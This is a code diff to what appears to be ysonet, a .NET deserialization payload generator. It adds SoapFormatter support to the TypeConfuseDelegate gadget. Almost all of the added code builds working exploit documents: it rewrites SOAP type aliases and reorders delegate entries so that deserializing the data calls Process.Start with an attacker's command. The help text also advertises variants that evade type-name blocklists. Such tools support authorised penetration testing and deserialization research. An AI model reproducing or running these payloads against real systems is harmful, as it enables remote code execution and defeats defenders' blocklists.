@@ -4,6 +4,10 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
+using System.Runtime.Serialization;
+using System.Runtime.Serialization.Formatters.Soap;
+using System.Text;
+using System.Xml;
 using ysonet.Helpers;
 using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;
 
@@ -35,8 +39,9 @@ namespace ysonet.Generators
      * of SortedSet (TreeSet derives from SortedSet).
      *
      * All three variants are .NET Framework 4.5+ payloads: Comparer<T>.Create and the
-     * ComparisonComparer<T> it returns do not exist in 4.0, and the stream carries the .NET 4
-     * mscorlib/System assembly identities.
+     * ComparisonComparer<T> it returns do not exist in 4.0. The target-specific
+     * TypeConfuseDelegateNet40Workflow is the separate target-specific generator for the
+     * different comparer shipped by .NET Framework 4.0.
      *
      * GetXamlGadget is the same technique with XamlReader.Parse in slot 1 instead of
      * Process.Start. It shares BuildConfusedContainer, so it offers the same three
@@ -51,6 +56,11 @@ namespace ysonet.Generators
      */
     public class TypeConfuseDelegateGenerator : GenericGenerator
     {
+        public override bool SupportsLegacyFx()
+        {
+            return false;
+        }
+
         // Discovery facets (category search only): runs a command directly via a
         // delegate/type confusion in a sorted framework container (mscorlib/System,
         // built-in). All three variants share these facets; only the serialized root
@@ -60,7 +70,6 @@ namespace ysonet.Generators
             return new GadgetFacetSet()
                 .WithKinds(PayloadKind.CodeExecution)
                 .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
-                // ComparisonComparer/Comparer.Create are 4.5-era; fired on 4.8.1
                 .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
         }
 
@@ -92,8 +101,14 @@ namespace ysonet.Generators
                 + "from SortedSet). Variants 2 and 3 refuse an input whose executable and argument "
                 + "strings compare equal, because both roots reject a duplicate key; variant 1 "
                 + "accepts it but its SortedSet then holds one element and does not fire, so make "
-                + "the two strings differ. Targets .NET Framework 4.5+ "
-                + "(Comparer<T>.Create and ComparisonComparer<T> do not exist in 4.0).";
+                + "the two strings differ. SoapFormatter is a direct CLR4 document for variants "
+                + "1 and 3: the target sees the native SortedSet<string> or TreeSet<string> root "
+                + "and ComparisonComparer<string>, with no Workflow surrogate, outer carrier, "
+                + "or nested BinaryFormatter stream. Variant 2 does not support "
+                + "SoapFormatter. All three variants target .NET Framework 4.5+; use "
+                + "TypeConfuseDelegateNet40Workflow for .NET Framework 4.0. --legacyfx "
+                + "is not supported because rewriting assembly versions cannot turn this "
+                + "Comparer<T>.Create graph into a CLR2 graph.";
         }
 
         public override List<string> Labels()
@@ -104,19 +119,28 @@ namespace ysonet.Generators
             return new List<string> { GadgetTags.Independent };
         }
 
-        private int variant_number = 1; // Default: SortedSet, the original payload
+        private int variant_number = 1; // Default: SortedSet, the original 4.5+ payload
+
+        // SoapFormatter's writer rejects closed generic objects before it writes their
+        // serialization data. These non-generic aliases exist only while authoring the XML;
+        // SerializeSoapCommandContainer replaces their element identities with the genuine
+        // CLR4 closed-generic types before returning the document.
+        private const string SoapSetAliasNamespace = "YsonetTcdSoapSetProxy";
+        private const string SoapSetAliasType = "YsonetTcdSetRootAlias";
+        private const string SoapComparerAliasNamespace = "YsonetTcdSoapComparerProxy";
+        private const string SoapComparerAliasType = "YsonetTcdComparerAlias";
 
         public override List<GadgetVariant> Variants()
         {
-            // No .Without(...) on any variant: the container swap does not change which
-            // serializers can carry the delegate graph. All three roots are generic
-            // [Serializable] types whose comparer travels through the same
-            // DelegateSerializationHolder record, so each variant supports the whole
-            // gadget-wide formatter union (verified by generation and marker firing).
+            // The direct SOAP authoring path covers the one-generic-layer SortedSet and
+            // TreeSet roots. SortedDictionary's backing graph adds TreeSet<KeyValuePair<...>>,
+            // a KeyValuePairComparer and a typed generic item array, so variant 2 stays out
+            // until that distinct document shape has its own measured effect proof.
             return new List<GadgetVariant>
             {
                 new GadgetVariant(1, "SortedSet (default)"),
-                new GadgetVariant(2, "SortedDictionary root (evasion)"),
+                new GadgetVariant(2, "SortedDictionary root (evasion)")
+                    .Without(Formatters.SoapFormatter),
                 new GadgetVariant(3, "TreeSet root (internal type evasion)")
             };
         }
@@ -146,17 +170,21 @@ namespace ysonet.Generators
             };
         }
 
-        // All three container variants ride every advertised formatter, so each token
-        // carries the "(3)" variant annotation. SoapFormatter is absent for all of them:
-        // every root (SortedSet`1, SortedDictionary`2, TreeSet`1) is a generic type and
-        // SoapFormatter cannot serialize one. The delegate is carried by a
-        // DelegateSerializationHolder record, which only the runtime formatters and
-        // NetDataContractSerializer reproduce; the public-member serializers (Json.NET,
-        // XmlSerializer, DataContractSerializer, and the rest) cannot rebuild a
-        // MulticastDelegate invocation list.
+        // BF, NDCS and Los carry all three variants. Soap carries SortedSet and TreeSet
+        // through direct document paths; variant 2's SortedDictionary adds a generic
+        // KeyValuePair tree and remains opted out. The
+        // delegate is carried by a DelegateSerializationHolder record, which only these
+        // runtime formatters and NetDataContractSerializer reproduce; the public-member
+        // serializers cannot rebuild a MulticastDelegate invocation list.
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter (3)", "NetDataContractSerializer (3)", "LosFormatter (3)" };
+            return new List<string>
+            {
+                "BinaryFormatter (3)",
+                "NetDataContractSerializer (3)",
+                "SoapFormatter (2)",
+                "LosFormatter (3)",
+            };
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -167,9 +195,13 @@ namespace ysonet.Generators
                 throw new Exception("Unknown TypeConfuseDelegate variant: " + variant_number
                     + " (use 1, 2, or 3).");
 
-            // No variant declares a formatter opt-out today. The call stays so a later
-            // opt-out cannot be declared in Variants() without being enforced here.
+            // Variant 2 deliberately opts out of SOAP; keep the metadata guard on the
+            // ordinary and embedded generation paths as well as in the interactive editor.
             GuardVariantFormatter(variant_number, formatter);
+
+            if (formatter.Equals(Formatters.SoapFormatter,
+                StringComparison.OrdinalIgnoreCase))
+                return SerializeSoapCommandContainer(variant_number, inputArgs);
 
             // The hand-built NRBF stream below is a hardcoded SortedSet graph, so it only
             // serves variant 1. Variants 2 and 3 take the normal Serialize() path, which
@@ -736,6 +768,268 @@ namespace ysonet.Generators
             return root;
         }
 
+        // Direct SoapFormatter form for the normal CLR4 gadget. The target sees the same
+        // native SortedSet<string>/TreeSet<string> -> ComparisonComparer<string> graph as
+        // the other formatters. No Workflow surrogate, outer carrier, or nested formatter
+        // is involved; aliases only work around the writer's closed-generic refusal.
+        private object SerializeSoapCommandContainer(int container, InputArgs inputArgs)
+        {
+            if (container != 1 && container != 3)
+                throw UnsupportedFormatter(Formatters.SoapFormatter);
+
+            ReadCommandFromFile(inputArgs);
+            string key1 = inputArgs.CmdFileName;
+            string key2 = inputArgs.HasArguments ? inputArgs.CmdArguments : "";
+            NoteIfArgumentsWillBeSwapped(inputArgs, key1, key2);
+
+            return SerializeSoapContainer(container, CultureSensitiveCompare,
+                ProcessStartSlot1(), key1, key2, true, inputArgs);
+        }
+
+        // One direct SOAP authoring body for every form of THIS gadget. The sorted root,
+        // comparer and DelegateSerializationHolder records are the TypeConfuseDelegate
+        // payload; callers vary only the harmless build-time comparison, the method placed
+        // in invocation-list slot 1, and the two strings it receives. Hosted gadgets may
+        // reuse this through SerializeSoapXamlGadget, the explicit hosted-gadget dependency
+        // allowed by Generators/README.md.
+        private object SerializeSoapContainer(int container,
+            Comparison<string> benignComparison, Delegate slot1,
+            string key1, string key2, bool keysMayCollide, InputArgs inputArgs)
+        {
+            if (container != 1 && container != 3)
+                throw new ArgumentException("SoapFormatter supports TypeConfuseDelegate "
+                    + "rootcontainer 1 (SortedSet) and 3 (TreeSet), not 2 "
+                    + "(SortedDictionary).");
+
+            var comparer = new SoapComparisonComparerProxy(benignComparison, slot1);
+            int order = comparer.Compare(key1, key2);
+            if (keysMayCollide && container == 3)
+                RejectEqualKeys(comparer, key1, key2, "TreeSet");
+
+            // A real SortedSet collapses equal values while ysonet fills it. Keep that
+            // established variant-1 behavior rather than letting the authored document
+            // invent a second item and an effect the ordinary object graph does not have.
+            string[] items = order == 0
+                ? new string[] { key1 }
+                : (order < 0
+                    ? new string[] { key1, key2 }
+                    : new string[] { key2, key1 });
+
+            var root = new SoapSetProxy(comparer, items);
+
+            string payload;
+            using (MemoryStream stream = new MemoryStream())
+            {
+                new SoapFormatter().Serialize(stream, root);
+                payload = Encoding.UTF8.GetString(stream.ToArray());
+            }
+
+            XmlDocument document = new XmlDocument();
+            document.PreserveWhitespace = true;
+            document.LoadXml(payload);
+
+            Type comparisonComparer = RequireSoapType(typeof(Comparer<>).Assembly,
+                "System.Collections.Generic.ComparisonComparer`1").MakeGenericType(
+                    typeof(string));
+            Type rootType;
+            if (container == 3)
+            {
+                rootType = RequireSoapType(typeof(SortedSet<>).Assembly,
+                    "System.Collections.Generic.TreeSet`1").MakeGenericType(typeof(string));
+            }
+            else
+            {
+                rootType = typeof(SortedSet<string>);
+            }
+
+            RewriteSoapTypeAlias(document, SoapSetAliasNamespace, SoapSetAliasType,
+                rootType.FullName, rootType.Assembly.FullName);
+            RewriteSoapTypeAlias(document, SoapComparerAliasNamespace, SoapComparerAliasType,
+                comparisonComparer.FullName, comparisonComparer.Assembly.FullName);
+            payload = document.OuterXml;
+
+            if (inputArgs.Minify)
+                payload = XmlMinifier.Minify(payload, null, null,
+                    FormatterType.SoapFormatter, true);
+
+            return FinishHandWrittenPayload(payload, Formatters.SoapFormatter,
+                inputArgs, null, true);
+        }
+
+        private static Type RequireSoapType(Assembly assembly, string fullName)
+        {
+            Type type = assembly.GetType(fullName, false);
+            if (type == null)
+                throw new SerializationException("Required SOAP target type is unavailable: "
+                    + fullName + " in " + assembly.FullName);
+            return type;
+        }
+
+        [Serializable]
+        private sealed class SoapComparisonComparerProxy : IComparer<string>, ISerializable
+        {
+            private readonly Comparison<string> authoringComparison;
+            private readonly SoapDelegateProxy comparison;
+
+            internal SoapComparisonComparerProxy(Comparison<string> benignComparison,
+                Delegate slot1)
+            {
+                if (benignComparison == null)
+                    throw new ArgumentNullException("benignComparison");
+                authoringComparison = benignComparison;
+                comparison = new SoapDelegateProxy(benignComparison, slot1);
+            }
+
+            private SoapComparisonComparerProxy(SerializationInfo info,
+                StreamingContext context)
+            {
+                throw new NotSupportedException(
+                    "The generation-only SOAP comparer proxy is never deserialized.");
+            }
+
+            public int Compare(string left, string right)
+            {
+                return authoringComparison(left, right);
+            }
+
+            public void GetObjectData(SerializationInfo info, StreamingContext context)
+            {
+                SetSoapAlias(info, SoapComparerAliasNamespace, SoapComparerAliasType);
+                info.AddValue("_comparison", comparison, typeof(object));
+            }
+        }
+
+        [Serializable]
+        private sealed class SoapDelegateEntryProxy : ISerializable
+        {
+            private readonly string delegateType;
+            private readonly string delegateAssembly;
+            private readonly string targetAssembly;
+            private readonly string targetType;
+            private readonly string method;
+            private readonly SoapDelegateEntryProxy next;
+
+            internal SoapDelegateEntryProxy(string delegateType, string delegateAssembly,
+                string targetAssembly, string targetType, string method,
+                SoapDelegateEntryProxy next)
+            {
+                this.delegateType = delegateType;
+                this.delegateAssembly = delegateAssembly;
+                this.targetAssembly = targetAssembly;
+                this.targetType = targetType;
+                this.method = method;
+                this.next = next;
+            }
+
+            private SoapDelegateEntryProxy(SerializationInfo info, StreamingContext context)
+            {
+                throw new NotSupportedException(
+                    "The generation-only SOAP delegate-entry proxy is never deserialized.");
+            }
+
+            public void GetObjectData(SerializationInfo info, StreamingContext context)
+            {
+                info.SetType(RequireSoapType(typeof(object).Assembly,
+                    "System.DelegateSerializationHolder+DelegateEntry"));
+                info.AddValue("type", delegateType);
+                info.AddValue("assembly", delegateAssembly);
+                info.AddValue("target", null);
+                info.AddValue("targetTypeAssembly", targetAssembly);
+                info.AddValue("targetTypeName", targetType);
+                info.AddValue("methodName", method);
+                info.AddValue("delegateEntry", next);
+            }
+        }
+
+        [Serializable]
+        private sealed class SoapDelegateProxy : ISerializable
+        {
+            private readonly SoapDelegateEntryProxy entry;
+            private readonly MethodInfo attackerMethod;
+            private readonly MethodInfo benignMethod;
+
+            internal SoapDelegateProxy(Comparison<string> benignComparison, Delegate slot1)
+            {
+                if (slot1 == null)
+                    throw new ArgumentNullException("slot1");
+                if (benignComparison.Target != null || slot1.Target != null)
+                    throw new ArgumentException("The direct TypeConfuseDelegate SOAP form "
+                        + "requires static methods in both invocation-list slots.");
+
+                benignMethod = benignComparison.Method;
+                attackerMethod = slot1.Method;
+
+                SoapDelegateEntryProxy benign = new SoapDelegateEntryProxy(
+                    benignComparison.GetType().FullName,
+                    benignComparison.GetType().Assembly.FullName,
+                    benignMethod.DeclaringType.Assembly.FullName,
+                    benignMethod.DeclaringType.FullName,
+                    benignMethod.Name,
+                    null);
+
+                // DelegateSerializationHolder stores the entries as a reverse-linked list.
+                // The physical head and method0 are the attacker; reconstruction restores the
+                // logical invocation order benign comparison -> slot-1 method.
+                entry = new SoapDelegateEntryProxy(
+                    slot1.GetType().FullName,
+                    slot1.GetType().Assembly.FullName,
+                    attackerMethod.DeclaringType.Assembly.FullName,
+                    attackerMethod.DeclaringType.FullName,
+                    attackerMethod.Name,
+                    benign);
+            }
+
+            private SoapDelegateProxy(SerializationInfo info, StreamingContext context)
+            {
+                throw new NotSupportedException(
+                    "The generation-only SOAP delegate proxy is never deserialized.");
+            }
+
+            public void GetObjectData(SerializationInfo info, StreamingContext context)
+            {
+                info.SetType(RequireSoapType(typeof(object).Assembly,
+                    "System.DelegateSerializationHolder"));
+                info.AddValue("Delegate", entry);
+                info.AddValue("method0", attackerMethod);
+                info.AddValue("method1", benignMethod);
+            }
+        }
+
+        [Serializable]
+        private sealed class SoapSetProxy : ISerializable
+        {
+            private readonly SoapComparisonComparerProxy comparer;
+            private readonly string[] items;
+
+            internal SoapSetProxy(SoapComparisonComparerProxy comparer, string[] items)
+            {
+                this.comparer = comparer;
+                this.items = items;
+            }
+
+            private SoapSetProxy(SerializationInfo info, StreamingContext context)
+            {
+                throw new NotSupportedException(
+                    "The generation-only SOAP set proxy is never deserialized.");
+            }
+
+            public void GetObjectData(SerializationInfo info, StreamingContext context)
+            {
+                SetSoapAlias(info, SoapSetAliasNamespace, SoapSetAliasType);
+                info.AddValue("Count", items.Length);
+                info.AddValue("Comparer", comparer, typeof(object));
+                info.AddValue("Version", items.Length);
+                info.AddValue("Items", items, typeof(string[]));
+            }
+        }
+
+        private static void SetSoapAlias(SerializationInfo info, string aliasNamespace,
+            string aliasType)
+        {
+            info.FullTypeName = aliasNamespace + "." + aliasType;
+            info.AssemblyName = aliasNamespace;
+        }
+
         // The -c value can name a file holding the real command.
         private static void ReadCommandFromFile(InputArgs inputArgs)
         {
@@ -782,10 +1076,9 @@ namespace ysonet.Generators
         // Used by the hosted gadgets ActivitySurrogateDisableTypeCheck and
         // XamlAssemblyLoadFromFile.
         //
-        // Every container here is a GENERIC type (SortedSet`1, SortedDictionary`2,
-        // TreeSet`1), and SoapFormatter cannot serialize a generic type, so any gadget
-        // variant that wraps its XAML here must declare .Without(Formatters.SoapFormatter)
-        // in Variants() and call GuardVariantFormatter in Generate().
+        // This object-returning API builds real closed-generic objects. It therefore cannot
+        // be passed to SoapFormatter's stock writer; SerializeSoapXamlGadget below is the
+        // direct-document twin for hosted gadgets.
         public static object GetXamlGadget(string xaml_payload)
         {
             return GetXamlGadget(xaml_payload, 1);
@@ -804,6 +1097,18 @@ namespace ysonet.Generators
             Delegate slot1 = new Func<string, object>(System.Windows.Markup.XamlReader.Parse);
             return BuildConfusedContainer(container, CultureSensitiveCompare, slot1,
                 xaml_payload, "", false);
+        }
+
+        // Direct SoapFormatter twin of GetXamlGadget. The final document exposes the same
+        // native CLR4 SortedSet<string>/TreeSet<string> root and
+        // ComparisonComparer<string>; the generation-only aliases do not survive. Container
+        // 2 is a different, deeper generic graph and remains an explicit unsupported cell.
+        public static object SerializeSoapXamlGadget(string xamlPayload, int container,
+            InputArgs inputArgs)
+        {
+            Delegate slot1 = new Func<string, object>(System.Windows.Markup.XamlReader.Parse);
+            return new TypeConfuseDelegateGenerator().SerializeSoapContainer(container,
+                CultureSensitiveCompare, slot1, xamlPayload, "", false, inputArgs);
         }
 
         // The option name every gadget that exposes the container choice uses, so the
@@ -825,7 +1130,8 @@ namespace ysonet.Generators
         public const string XamlRootContainerOptionHelp =
             "Serialized root container of the TypeConfuseDelegate wrapper: "
             + "1 -> SortedSet [default], 2 -> SortedDictionary, 3 -> TreeSet. 2 and 3 evade "
-            + "a binder or blocklist that rejects the exact SortedSet wire type name. Not "
+            + "a binder or blocklist that rejects the exact SortedSet wire type name. "
+            + "SoapFormatter supports 1 and 3, not 2. Not "
             + "used by the TextFormattingRunProperties wrapper (variant 2), which has no "
             + "container.";
 
